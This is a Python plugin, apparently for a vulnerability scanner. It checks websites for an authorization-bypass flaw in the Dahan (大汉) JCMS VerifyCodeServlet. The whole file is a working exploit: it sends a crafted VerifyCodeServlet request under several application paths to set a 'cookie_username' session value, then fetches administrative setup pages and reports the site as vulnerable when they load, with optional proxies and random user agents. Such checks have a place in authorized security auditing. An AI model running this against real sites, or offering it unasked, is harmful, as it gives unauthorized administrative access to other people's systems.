#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 大汉VerfiyCodeServlet越权漏洞
referer: http://www.2cto.com/Article/201507/418593.html
author: Lucifer
description: /VerifyCodeServlet 可以 创建任意 SESSION的key值,opr_licenceinfo.jsp需要一个SESSION cookie_username 不为空，就可以成功登录。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

paths=['/vipchat/','/jcms/','/jsearch/','/jact/','/vc/','/xxgk/']
payload = 'VerifyCodeServlet?var=cookie_username'
adminpaths=['setup/opr_licenceinfo.jsp','setup/admin.jsp']
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    global resp2

    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        for path in paths:
            payload_url = scheme + "://" + url +path+ payload
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url,  headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            code = resp.status_code
            if code==200 :
                for adminpath in adminpaths:
                    adminurl = scheme + "://" +url+ path + adminpath
                    if ProxyIp != None:
                        proxies = {
                            # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                            "http": "http://" + str(ProxyIp)
                        }
                        resp2 = requests.get(adminurl, headers=headers, proxies=proxies, timeout=5, verify=False)
                    elif ProxyIp == None:
                        resp2 = requests.get(adminurl, headers=headers, timeout=5, verify=False)
                    con2 = resp2.text
                    code2 = resp2.status_code
                    if code2 == 200 and (con2.lower().find('admin')!=-1 or con2.lower().find('icence')!=-1):
                            Medusa = "{} 存在大汉VerfiyCodeServlet越权漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                            return (Medusa)
    except Exception as e:
        pass